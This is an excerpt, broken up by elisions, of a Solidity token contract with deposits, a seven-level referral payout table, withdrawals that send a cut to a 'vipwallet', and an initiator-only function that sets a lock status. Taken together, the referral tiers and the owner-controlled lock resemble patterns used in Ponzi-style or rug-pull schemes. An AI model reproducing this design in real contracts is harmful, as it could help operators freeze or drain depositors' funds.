...
contract FIZddODapdp11112 is IERC20,Initializable
{
    ...
    uint256 constant _initialCoinRate = 100000000;
    uint256  TotalHoldings;
    uint256[] public LEVEL_PERCENTS;
	uint256[] public LEVEL_UNLOCK;
    ...
    function initialize(string memory Name,string memory Symbol,address user,address Vvipwallet, address Mmarketingwallet )  public initializer {
       
        _name = Name;
        _symbol = Symbol;
        initiator = payable(user);
        aggregator = payable(user);
        initializeTime = block.timestamp;
        vipwallet=Vvipwallet;
        marketingwallet=Mmarketingwallet;

        LEVEL_PERCENTS=[1100,300, 200, 100, 100, 100, 200];
	    LEVEL_UNLOCK=[0e18, 200e18, 400e18, 800e18, 1600e18, 3200e18, 6400e18];
    ...
    function fizoWithdraw(uint8 _perc) public{
        ...
        payouts[msg.sender].push(Withdraw(
         ...
         if(deduct > 10)
         {
             ...
             uint256 withdrawable5 =withdrawable1.mul(3).div(100);
             withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5);
             payable(vipwallet).transfer(withdrawable5);
   ...
   function deposit(address _referer) public payable
   {
    ...
    function fizosp(uint8 status) external onlyInitiator{
            lock=status;
        }
